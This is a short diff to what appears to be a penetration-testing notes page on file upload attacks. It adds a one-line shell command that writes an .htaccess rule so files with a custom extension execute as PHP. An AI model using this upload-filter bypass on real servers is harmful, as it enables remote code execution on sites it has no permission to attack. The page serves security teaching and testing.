@@ -135,7 +135,11 @@ AddType application/x-httpd-php .abc
 ------abcdefghijk
 ```
 
-  
+If you have the ability to upload files, maybe try this:
+
+```
+echo "AddType application/x-httpd-php .dork" > .htaccess
+```
 
 ## [Magic Bytes](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes)
 
